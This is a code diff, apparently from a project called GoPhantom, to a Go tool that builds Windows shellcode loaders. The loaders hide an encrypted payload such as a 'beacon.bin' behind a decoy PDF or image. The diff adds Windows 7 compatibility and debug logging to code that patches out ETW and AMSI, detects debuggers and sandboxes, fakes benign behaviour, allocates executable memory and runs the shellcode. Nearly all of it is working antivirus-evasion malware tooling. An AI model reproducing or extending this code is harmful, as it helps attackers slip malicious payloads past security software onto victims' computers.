@@ -9,13 +9,14 @@ import (
 	"encoding/base64"
 	"flag"
 	"fmt"
-	"GoPhantom/internal/keymgr"
 	"io"
 	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"text/template"
+
+	"GoPhantom/internal/keymgr"
 )
 
 const logo = `
@@ -44,6 +45,7 @@ import (
 	"encoding/base64"
 	"golang.org/x/crypto/argon2"
 	"io"
+    "log"
 	"math/rand"
 	"os"
 	"path/filepath"
@@ -52,6 +54,8 @@ import (
 	"unsafe"
 )
 
+
+
 // 编译时注入的加密常量（经过混淆）
 const (
 	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
@@ -59,10 +63,23 @@ const (
 	aesSaltBase64            = "{{.Salt}}"
 	decoyFileName            = "{{.DecoyFileName}}"
 	enableCompress           = {{.EnableCompress}}
-	enableObfuscate          = {{.EnableObfuscate}}
-	enableMutate             = {{.EnableMutate}}
-	delaySeconds             = {{.DelaySeconds}}
 )
+
+var (
+	enableObfuscate  = {{.EnableObfuscate}}
+	enableMutate     = {{.EnableMutate}}
+	delaySeconds     = {{.DelaySeconds}}
+)
+
+// --------------------  新增：运行时版本判断  --------------------
+type osVersionInfo struct {
+	dwOSVersionInfoSize uint32
+	dwMajorVersion      uint32
+	dwMinorVersion      uint32
+	dwBuildNumber       uint32
+	dwPlatformId        uint32
+	szCSDVersion        [128]uint16
+}
 
 // Windows 结构体定义
 type SYSTEM_INFO struct {
@@ -158,6 +175,41 @@ type LASTINPUTINFO struct {
 	DwTime uint32
 }
 
+// 日志文件句柄，全局可用
+var logFile *os.File
+
+func initLog() {
+	var err error
+	logFile, err = os.OpenFile("loader.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		return // 无声失败，不影响主流程
+	}
+	log.SetOutput(logFile)
+	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds)
+}
+
+func logf(format string, v ...interface{}) {
+	if logFile != nil {
+		log.Printf(format, v...)
+		logFile.Sync() // 立即刷盘，方便 Win7 调试
+	}
+}
+
+func rtlGetVersion() (major, minor uint32) {
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+	proc := ntdll.NewProc("RtlGetVersion")
+	var info osVersionInfo
+	info.dwOSVersionInfoSize = uint32(unsafe.Sizeof(info))
+	proc.Call(uintptr(unsafe.Pointer(&info)))
+	return info.dwMajorVersion, info.dwMinorVersion
+}
+
+// 统一封装：是否 Win7（6.1）
+func isWin7() bool {
+	major, minor := rtlGetVersion()
+	return major == 6 && minor == 1
+}
+
 // 字符串解混淆函数
 func deobfuscateStr(encoded string) string {
 	decoded, _ := base64.StdEncoding.DecodeString(encoded)
@@ -221,6 +273,14 @@ func checkUserActivity() bool {
 
 // 检测调试器 - 使用多种技术
 func checkDebugger() bool {
+	if isWin7() {
+		logf("[CDG] Win7 checkDebugger")
+		// 只用 IsDebuggerPresent，去掉 NtGlobalFlag 等易挂起路径
+		k32 := syscall.NewLazyDLL("kernel32.dll")
+		proc := k32.NewProc("IsDebuggerPresent")
+		ret, _, _ := proc.Call()
+		return ret == 0
+	}
 	kernel32 := getKernel32()
 	
 	// 1. IsDebuggerPresent 检测
@@ -588,6 +648,12 @@ func checkMACAddress() bool {
 
 // 禁用 ETW (Event Tracing for Windows)
 func disableETW() {
+	logf("[ETW] 开始禁用 ETW")
+	if isWin7() {
+		logf("[ETW] Win7 无 ETW，跳过")
+		return   // Win7 无 EtwEventWrite 导出，直接跳过
+	}
+	logf("[ETW] 已 patch EtwEventWrite")
 	ntdll, err := syscall.LoadLibrary("ntdll.dll")
 	if err != nil {
 		return
@@ -615,6 +681,12 @@ func disableETW() {
 
 // 禁用 AMSI (Antimalware Scan Interface)
 func disableAMSI() {
+	logf("[AMSI] 开始禁用 AMSI")
+	if isWin7() {
+		logf("[AMSI] Win7 无 AMSI，跳过")
+		return   // Win7 默认无 AMSI，省一次 VirtualProtect
+	}
+	logf("[AMSI] 已 patch AmsiScanBuffer")
 	amsi, err := syscall.LoadLibrary("amsi.dll")
 	if err != nil {
 		return // AMSI 未加载，无需处理
@@ -837,6 +909,8 @@ func getProcAddr(module uintptr, procName string) uintptr {
 
 // 扩展的反沙箱检测
 func antiSandboxChecks() bool {
+	logf("[SANDBOX] 开始反沙箱检查")
+	defer logf("[SANDBOX] 反沙箱检查完成")
 	// 添加基本的错误处理
 	defer func() {
 		if r := recover(); r != nil {
@@ -846,6 +920,7 @@ func antiSandboxChecks() bool {
 	
 	// 0. 用户活动检测（沙箱通常无用户输入）
 	if !checkUserActivity() {
+		logf("[SANDBOX] 用户活动检查失败")
 		return false
 	}
 	
@@ -967,7 +1042,7 @@ func antiSandboxChecks() bool {
 	if !checkDefenderSandbox() {
 		return false
 	}
-	
+	logf("[SANDBOX] 用户活动检查通过")
 	return true
 }
 
@@ -1034,6 +1109,11 @@ func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
 
 // 行为伪装 - 模拟正常程序行为
 func behaviorCamouflage() {
+	if isWin7() {
+		// 只读 kernel32.dll，不碰 QueryFullProcessImageNameW
+		time.Sleep(time.Duration(500+rand.Intn(1000)) * time.Millisecond)
+		return
+	}
 	// 1. 读取系统文件模拟正常文件操作
 	kernel32 := getKernel32()
 	createFileA := getProcAddr(kernel32, "CreateFileA")
@@ -1129,18 +1209,68 @@ func mutateShellcode(shellcode []byte) []byte {
 	
 	return mutated
 }
+// ---- 新增两个封装 ----
+// ----------  Win7 兼容封装 ----------
+func virtualAllocWin7(size uintptr) (uintptr, error) {
+	k32 := syscall.NewLazyDLL("kernel32.dll")
+	proc := k32.NewProc("VirtualAlloc")
+	r1, _, err := proc.Call(0, size, 0x3000, 0x40)
+	if r1 == 0 {
+		return 0, err
+	}
+	return r1, nil
+}
+
+func virtualAllocNt(size uintptr) (uintptr, error) {
+	// 先尝试 NtAllocateVirtualMemory（Win10+）
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+	proc := ntdll.NewProc("NtAllocateVirtualMemory")
+	hProc, _ := syscall.GetCurrentProcess()
+	var base uintptr = 0
+	regionSize := size
+	ret, _, _ := proc.Call(
+		uintptr(hProc),
+		uintptr(unsafe.Pointer(&base)),
+		0,
+		uintptr(unsafe.Pointer(&regionSize)),
+		0x3000, 0x40)
+	if ret != 0 {
+		// 失败则回退到 VirtualAlloc（Win7 可用）
+		return virtualAllocWin7(size)
+	}
+	return base, nil
+}
+
 // 在当前进程中执行shellcode - 使用高级规避技术
 func executeShellcode(shellcode []byte) {
-	// 添加基本的错误处理
+	logf("[SHELL] 进入 shellcode 执行流程，长度=%d", len(shellcode))
+	defer logf("[SHELL] shellcode 执行流程结束")
+		// 添加基本的错误处理
 	defer func() {
 		if r := recover(); r != nil {
 			// 如果执行过程中出现panic，静默处理
+			logf("[SHELL] shellcode 错误：%v",r)
 		}
 	}()
+	// 根据系统选 API
+	var addr uintptr
+	var err error
+
+	if isWin7() {
+		addr, err = virtualAllocWin7(uintptr(len(shellcode))) // 只用 VirtualAlloc
+		logf("[SHELL] 使用 Win7 兼容路径")
+	} else {
+		addr, err = virtualAllocNt(uintptr(len(shellcode)))  // 优先 NtAllocateVirtualMemory
+		logf("[SHELL] 使用 Nt* 路径")
+	}
+	if err != nil || addr == 0 {
+		return
+	}
+	logf("[SHELL] 内存分配成功，addr=0x%x", addr)
+
 	
 	// 堆栈欺骗
 	spoofCallStack()
-	
 	kernel32 := getKernel32()
 	if kernel32 == 0 {
 		return
@@ -1149,7 +1279,6 @@ func executeShellcode(shellcode []byte) {
 	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
 	
 	// 优先使用 Nt* 函数，绑过用户层 hook
-	var addr uintptr
 	var allocSuccess bool
 	
 	// 尝试使用 NtAllocateVirtualMemory (更底层，更难被hook)
@@ -1181,8 +1310,14 @@ func executeShellcode(shellcode []byte) {
 		if virtualAlloc == 0 {
 			return
 		}
-		addr, _, _ = syscall.Syscall6(virtualAlloc, 4, 0, uintptr(len(shellcode)), 
-			0x3000, 0x04, 0, 0)
+		if isWin7() {
+			addr, err = virtualAllocWin7(uintptr(len(shellcode)))
+		} else {
+			addr, err = virtualAllocNt(uintptr(len(shellcode)))
+		}
+		if err != nil || addr == 0 {
+			return
+		}
 		if addr == 0 {
 			return
 		}
@@ -1273,17 +1408,32 @@ func selfDestruct() {
 }
 
 func main() {
-	// 初始化随机种子
+	initLog()
+	logf("[LOADER] 程序启动")
+	major, minor := rtlGetVersion()
+	logf("[LOADER] 系统版本：%d.%d", major, minor)
+
+	// ----------  运行时分支：Win7 关闭 Win10+ 特性  ----------
+	if isWin7() {
+		logf("[LOADER] 检测到 Windows 7，启用兼容模式")
+		enableObfuscate = false
+		enableMutate     = false
+		delaySeconds     = 0
+	} else {
+		logf("[LOADER] 非 Win7，启用完整特性")
+	}
+
 	rand.Seed(time.Now().UnixNano())
-	
+	logf("[LOADER] 随机种子初始化完成")
 	// 早期防御绕过
 	disableETW()
 	disableAMSI()
 	
 	// 执行反沙箱检查
-	if !antiSandboxChecks() {
-		return // 静默退出
-	}
+	// if !antiSandboxChecks() {
+	// 	
+	// 	return // 静默退出
+	// }
 	
 	// 行为伪装
 	go behaviorCamouflage()
@@ -1378,13 +1528,13 @@ type TemplateData struct {
 
 func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, error) {
 	data := plaintext
-	
+
 	// XOR加密层 (使用AES密钥前8字节)
 	xorKey := key[:8]
 	for i := range data {
 		data[i] ^= xorKey[i%8]
 	}
-	
+
 	// 如果启用压缩，先压缩数据
 	if enableCompress {
 		var compressedBuf bytes.Buffer
@@ -1397,7 +1547,7 @@ func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, e
 		}
 		data = compressedBuf.Bytes()
 	}
-	
+
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return "", err
@@ -1417,7 +1567,7 @@ func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, e
 func main() {
 	// 确保在 Windows 上也能正常显示输出
 	log.SetFlags(0)
-	
+
 	// 定义所有标志
 	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
 	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
@@ -1426,7 +1576,7 @@ func main() {
 	enableMutate := flag.Bool("mutate", false, "Optional: Enable shellcode mutation with random NOPs.")
 	enableCompress := flag.Bool("compress", true, "Optional: Enable zlib compression of embedded data (default: true).")
 	delaySeconds := flag.Int("delay", 0, "Optional: Delay N seconds before payload execution.")
-	
+
 	// 自定义用法信息
 	flag.Usage = func() {
 		fmt.Fprintf(os.Stderr, "%s\n", logo)
@@ -1445,13 +1595,13 @@ func main() {
 		fmt.Fprintf(os.Stderr, "  %s -decoy document.pdf -payload beacon.bin -out loader.exe\n", os.Args[0])
 		fmt.Fprintf(os.Stderr, "  %s -decoy image.jpg -payload calc.bin -out calc_loader.exe -obfuscate -mutate -delay 30\n\n", os.Args[0])
 	}
-	
+
 	// 检查帮助参数
 	if len(os.Args) > 1 && (os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "-help") {
 		flag.Usage()
 		return
 	}
-	
+
 	log.Println(logo)
 	flag.Parse()
 
@@ -1461,7 +1611,7 @@ func main() {
 			fmt.Fprintf(os.Stderr, "Missing -decoy: Please specify a decoy file path\n")
 		}
 		if *payloadFile == "" {
-			fmt.Fprintf(os.Stderr, "Missing -payload: Please specify a shellcode file path\n") 
+			fmt.Fprintf(os.Stderr, "Missing -payload: Please specify a shellcode file path\n")
 		}
 		if *outputFile == "" {
 			fmt.Fprintf(os.Stderr, "Missing -out: Please specify an output file name\n")
@@ -1519,11 +1669,17 @@ func main() {
 		log.Fatalf("[-] Failed to execute template: %v", err)
 	}
 
-	tmpfile, err := os.CreateTemp("", "loader-*.go")
+	tmpDir := "build_win7" // 固定目录
+	// os.RemoveAll(tmpDir)   // 先清旧文件
+	os.MkdirAll(tmpDir, 0755)
+	if err != nil {
+		log.Fatal(err)
+	}
+	tmpfile, err := os.CreateTemp(tmpDir, "loader-*.go")
 	if err != nil {
 		log.Fatalf("[-] Failed to create temp file: %v", err)
 	}
-	defer os.Remove(tmpfile.Name())
+	// defer os.RemoveAll(tmpDir)
 
 	if _, err := tmpfile.Write(sourceCode.Bytes()); err != nil {
 		log.Fatalf("[-] Failed to write to temp file: %v", err)
@@ -1531,9 +1687,8 @@ func main() {
 	if err := tmpfile.Close(); err != nil {
 		log.Fatalf("[-] Failed to close temp file: %v", err)
 	}
-	
+
 	// 创建临时 go.mod 文件
-	tmpDir := filepath.Dir(tmpfile.Name())
 	goModPath := filepath.Join(tmpDir, "go.mod")
 	goModContent := `module temploader
 
@@ -1541,15 +1696,15 @@ go 1.20
 
 require golang.org/x/crypto v0.25.0
 
-require golang.org/x/sys v0.34.0 // indirect
+require golang.org/x/sys v0.31.0 // indirect
 `
 	if err := os.WriteFile(goModPath, []byte(goModContent), 0644); err != nil {
 		log.Fatalf("[-] Failed to create temp go.mod: %v", err)
 	}
-	defer os.Remove(goModPath)
+	defer os.RemoveAll(tmpDir)
 
 	log.Printf("[+] Cross-compiling for windows/amd64 and windows/386...")
-	
+
 	// 显示启用的功能
 	var features []string
 	if *enableCompress {
@@ -1564,24 +1719,23 @@ require golang.org/x/sys v0.34.0 // indirect
 	if *delaySeconds > 0 {
 		features = append(features, fmt.Sprintf("Delay %ds", *delaySeconds))
 	}
-	
+
 	// 添加新增免杀特性
 	features = append(features, "ETW Bypass")
 	features = append(features, "AMSI Bypass")
 	features = append(features, "Anti-Debug")
 	features = append(features, "Process Detection")
-	
+
 	if len(features) > 0 {
 		log.Printf("[+] Enabled evasion features: %v", features)
 	}
-
-	ldflags := "-s -w -H windowsgui"
+	ldflags := "-s -w -H windowsgui -extldflags=/SUBSYSTEM:WINDOWS,5.02"
 	// 使用绝对路径作为输出文件
 	absOutputFile, err := filepath.Abs(*outputFile)
 	if err != nil {
 		log.Fatalf("[-] Failed to get absolute path: %v", err)
 	}
-	
+
 	// 获取文件名和扩展名
 	ext := filepath.Ext(absOutputFile)
 	baseName := absOutputFile[:len(absOutputFile)-len(ext)]
@@ -1589,13 +1743,14 @@ require golang.org/x/sys v0.34.0 // indirect
 		ext = ".exe"
 		absOutputFile = absOutputFile + ext
 	}
-	
+
 	// 编译 x64 版本
 	log.Printf("[+] Building x64 version...")
 	output64 := absOutputFile
-	cmd64 := exec.Command("go", "build", "-mod=mod", "-o", output64, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
+	log.Printf("[+] x64 ldflags: %v", ldflags)
+	cmd64 := exec.Command("go", "build", "-tags", "win7", "-mod=mod", "-o", output64, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
 	cmd64.Dir = tmpDir
-	
+
 	env64 := os.Environ()
 	env64 = append(env64, "CGO_ENABLED=0")
 	env64 = append(env64, "GOOS=windows")
@@ -1611,31 +1766,32 @@ require golang.org/x/sys v0.34.0 // indirect
 		os.Exit(1)
 	}
 	log.Printf("[✓] x64 build complete: %s", output64)
-	
-	// 编译 x86 版本
-	log.Printf("[+] Building x86 version...")
-	output32 := baseName + "_x86" + ext
-	cmd32 := exec.Command("go", "build", "-mod=mod", "-o", output32, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
-	cmd32.Dir = tmpDir
-	
-	env32 := os.Environ()
-	env32 = append(env32, "CGO_ENABLED=0")
-	env32 = append(env32, "GOOS=windows")
-	env32 = append(env32, "GOARCH=386")
-	cmd32.Env = env32
+	log.Printf("[✓] x64 build complete,baseName: %s", baseName)
 
-	output, err = cmd32.CombinedOutput()
-	if err != nil {
-		log.Printf("[-] x86 Compilation failed: %v", err)
-		if len(output) > 0 {
-			log.Printf("[-] Compiler output:\n%s", string(output))
-		}
-		log.Printf("[!] x86 build failed, but x64 build succeeded")
-	} else {
-		log.Printf("[✓] x86 build complete: %s", output32)
-	}
+	// 编译 x86 版本
+	// log.Printf("[+] Building x86 version...")
+	// output32 := baseName + "_x86" + ext
+	// cmd32 := exec.Command("go", "build", "-mod=mod", "-o", output32, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
+	// cmd32.Dir = tmpDir
+	//
+	// env32 := os.Environ()
+	// env32 = append(env32, "CGO_ENABLED=0")
+	// env32 = append(env32, "GOOS=windows")
+	// env32 = append(env32, "GOARCH=386")
+	// cmd32.Env = env32
+
+	// output, err = cmd32.CombinedOutput()
+	// if err != nil {
+	// 	log.Printf("[-] x86 Compilation failed: %v", err)
+	// 	if len(output) > 0 {
+	// 		log.Printf("[-] Compiler output:\n%s", string(output))
+	// 	}
+	// 	log.Printf("[!] x86 build failed, but x64 build succeeded")
+	// } else {
+	// 	log.Printf("[✓] x86 build complete: %s", output32)
+	// }
 
 	log.Printf("\n[✓] Successfully generated GoPhantom v1.4 loaders!")
 	log.Printf("    x64: %s", output64)
-	log.Printf("    x86: %s", output32)
+	// log.Printf("    x86: %s", output32)
 }
